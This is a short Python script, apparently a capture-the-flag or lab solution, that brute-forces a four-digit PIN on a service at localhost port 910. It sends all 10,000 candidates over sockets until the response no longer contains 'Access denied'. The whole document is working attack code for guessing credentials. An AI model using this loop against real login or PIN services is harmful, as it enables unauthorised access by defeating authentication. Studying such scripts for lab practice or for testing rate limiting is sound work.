#!/usr/bin/env python3

import socket
import sys


for i in range(10000):
    sys.stdout.write(f"\rTrying: {i:04d}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 910))
    s.recv(4096)
    s.send(f"{i:04d}\n".encode())
    resp = s.recv(4096)
    if not b"Access denied" in resp:
        print(f"\rFound pin: {i:04d}")
        break
    s.close()
